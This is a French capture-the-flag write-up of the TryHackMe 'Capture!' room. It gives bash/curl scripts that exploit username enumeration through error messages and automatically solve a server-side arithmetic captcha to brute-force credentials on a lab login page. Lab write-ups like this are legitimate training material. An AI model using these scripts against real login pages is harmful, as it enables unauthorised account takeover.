
# THM - Capture! writeup

Lien : https://tryhackme.com/room/capture

## Etape 1 : discovery
On a un site à disposition, avec une petite histoire : pas de WAF, les développeurs ont fait leur propre popote...

On commence par télécharger une archive Zip, avec une liste de usernames et une liste de password. Facile - _trop facile_ ?

On se connecte sur le site : rien de particulier, une simple page de login.
Sauf que très vite, si on essaye des combinaisons au pif, un captcha apparait !

C'est une simple opération arithmétique. **Mais** on remarque
- qu'il n'y a aucun cookie, aucun champ caché dans le formulaire
- que si la valeur du captcha est mauvaise, on a un "Invalid captcha" - au lieu d'un "user does not exist"

--> Conclusion : le captcha est géré _server-side_, autrement dit pas possible de faire des requêtes en parallèle : chaque nouvelle HTTP request doit contenir la réponse au captcha de la HTTP response précédente 😞 

Ça veut dire : pas le droit à Hydra, ni Ffuf, ni quoi que ça soit d'autre.

Pas grave, on passe en mode manuel.

## Etape 2 : trouver le username
Le message d'erreur est un indice : l'utilisateur "does not exist". Autrement dit, avec un utilisateur qui existe, on aurait (peut-être, _probablement_ même) un message différent.

Résoudre le captcha n'est pas un souci : la question est sur la 97ème ligne de la HTTP response précédente, et une simple opération peut être automatisée.

On commence donc par écrire le script suivant pour extraire le username.

```
#!/bin/bash
curl 'http://10.10.240.139/login' -s -X POST \
  --data-raw 'username=test&password=test' > lastresponse


for i in $(cat usernames.txt); do
        # Get captcha answer from last HTTP responsei, line 97
        # (use bc to get the result)
        captcha=$(cat lastresponse | sed -n '97p'|sed 's/ =.*//' | bc)

        # username cleansing - too lazy to set IFS
        user=$(echo $i|sed 's/[^a-z]//g')

        # new attempt
        curl 'http://10.10.240.139/login' -s -X POST \
          --data-raw "username=$user&password=test&captcha=$captcha" \
          > lastresponse

        # check if last response is different
        cat lastresponse | sed -n '105p' | grep -v "does not exist" \
         && echo $user && break
done
```

Y'a plus qu'à :
```
┌──(root㉿kali)-[~/Downloads]
└─# ./get_username.sh
    <p class="error"><strong>Error:</strong> Invalid password for user &#39;xxxREDACTEDxxx&#39;
xxxREDACTEDxxx
```

Et hop on a le username en quelques secondes.

## Etape 3 : trouver le password
On va faire exactement pareil, à un détail près : si on trouve le bon password, on risque de _ne pas_ avoir de message d'erreur. **Mais** on n'aura probablement aucun captcha à calculer pour la fois suivante -- donc le message suivant sera probablement "Invalid Captcha"

```
curl 'http://10.10.240.139/login' -s -X POST \
  --data-raw 'username=test&password=test' > lastresponse

previous=
for i in $(cat passwords.txt); do
        # Get captcha ...
        captcha=$(cat lastresponse | sed -n '97p'|sed 's/ =.*//' | bc)
        # Too lazy again...
        password=$(echo $i | sed 's/[^a-zA-Z0-9]//')
        curl 'http://10.10.240.139/login' -s -X POST \
          --data-raw "username=$1&password=$password&captcha=$captcha" \
          > lastresponse
        cat lastresponse | sed -n '105p' | grep -v "Invalid password for" \
          && echo $previous && break
        previous=$password
done
```

Encore une fois, y'a plus qu'à :

```
┌──(root㉿kali)-[~/Downloads]
└─# ./get_password.sh xxxREDACTED_USERxxx
    <p class="error"><strong>Error:</strong> Invalid captcha
xxxREDACTED_PASSWORDxxx
```

## Etape 4 (et dernière) : trouver le flag
Là, c'est plutôt simple : on se logge avec le username et le password qu'on a trouvé : il s'affiche. Tout simplement.

Bonus : le script suivant automatise toute la résolution (username, password, et même flag)

```
#!/bin/bash
curl 'http://10.10.240.139/login' -s -X POST \
  --data-raw 'username=test&password=test' > lastresponse

for i in $(cat usernames.txt); do
        # Get captcha answer from last HTTP responsei, line 97
        # (use bc to get the result)
        captcha=$(cat lastresponse | sed -n '97p'|sed 's/ =.*//' | bc)

        # username cleansing - too lazy to set IFS
        user=$(echo $i|sed 's/[^a-z]//g')

        # new attempt
        curl 'http://10.10.240.139/login' -s -X POST \
          --data-raw "username=$user&password=test&captcha=$captcha" \
          > lastresponse

        # check if last response is different
        cat lastresponse | sed -n '105p' | grep -v "does not exist" \
        > /dev/null && break
done

echo Found username: $user

previous=
for i in $(cat passwords.txt); do
        # Get captcha ...
        captcha=$(cat lastresponse | sed -n '97p'|sed 's/ =.*//' | bc)
        # Too lazy again...
        password=$(echo $i | sed 's/[^a-zA-Z0-9]//')
        curl 'http://10.10.240.139/login' -s -X POST \
          --data-raw "username=$user&password=$password&captcha=$captcha" \
          > lastresponse
        cat lastresponse | sed -n '105p' | grep -v "Invalid password for" \
         > /dev/null && break
        previous=$password
done

echo Found password: $previous

captcha=$(cat lastresponse | sed -n '97p'|sed 's/ =.*//' | bc)
curl 'http://10.10.240.139/login' -s -X POST \
  --data-raw "username=$user&password=$previous&captcha=$captcha" \
  | sed 's/<[^>]*>//g'
```
Et voilà !
